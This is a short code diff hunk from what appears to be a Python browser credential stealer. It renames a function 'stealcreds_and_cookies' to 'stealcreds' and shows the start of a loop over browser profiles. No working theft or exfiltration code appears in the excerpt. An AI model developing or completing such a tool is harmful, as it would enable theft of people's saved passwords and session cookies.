@@ -82,7 +82,7 @@ def get_browser_version(browser_path):
             return prefs.get("browser", {}).get("last_version", "")
     return ""
 
-def stealcreds_and_cookies():
+def stealcreds():
     results = {}
     for browser, path in BROWSERS.items():
         browser_result = {}
